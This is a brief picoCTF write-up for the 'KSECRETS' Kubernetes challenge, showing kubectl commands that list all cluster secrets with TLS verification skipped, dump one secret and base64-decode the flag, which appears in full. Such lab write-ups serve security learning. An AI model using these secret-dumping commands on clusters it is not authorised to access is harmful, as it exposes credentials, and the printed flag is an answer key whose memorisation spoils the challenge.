
# Reto 
### KSECRETS
## Descripcion
We have a kubernetes cluster setup and flag is in the secrets. You think you can get it?Please wait for a minute for the application to be configured!Kubernetes is running at: green-hill.picoctf.net : 57586You can find your configuration file [here](http://green-hill.picoctf.net:65238/kubeconfig).
## Solucion
```
Aaxel0583-picoctf@webshell:~$ kubectl --kubeconfig kubeconfig.yaml --insecure-skip-tls-verify=true get secrets -A
NAMESPACE     NAME                       TYPE                               DATA   AGE
kube-system   chart-values-traefik       helmcharts.helm.cattle.io/values   1      11m
kube-system   chart-values-traefik-crd   helmcharts.helm.cattle.io/values   0      11m
kube-system   k3s-serving                kubernetes.io/tls                  2      11m
picoctf       ctf-secret                 Opaque                             1      11m
Aaxel0583-picoctf@webshell:~$ kubectl --kubeconfig kubeconfig.yaml --insecure-skip-tls-verify=true get secret ctf-secret -n picoctf -o yaml
apiVersion: v1
data:
  flag: cGljb0NURntrczNjcjM3NV80MW43X3M0ZjNfMzNmZGVhMGR9Cg==
kind: Secret
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","data":{"flag":"cGljb0NURntrczNjcjM3NV80MW43X3M0ZjNfMzNmZGVhMGR9Cg=="},"kind":"Secret","metadata":{"annotations":{},"name":"ctf-secret","namespace":"picoctf"},"type":"Opaque"}
  creationTimestamp: "2026-03-19T01:40:29Z"
  name: ctf-secret
  namespace: picoctf
  resourceVersion: "388"
  uid: d3ea61eb-ef43-473e-9844-1b179cfde74c
type: Opaque
Aaxel0583-picoctf@webshell:~$ echo cGljb0NURntrczNjcjM3NV80MW43X3M0ZjNfMzNmZGVhMGR9Cg== | base64 -d
picoCTF{ks3cr375_41n7_s4f3_33fdea0d}
```


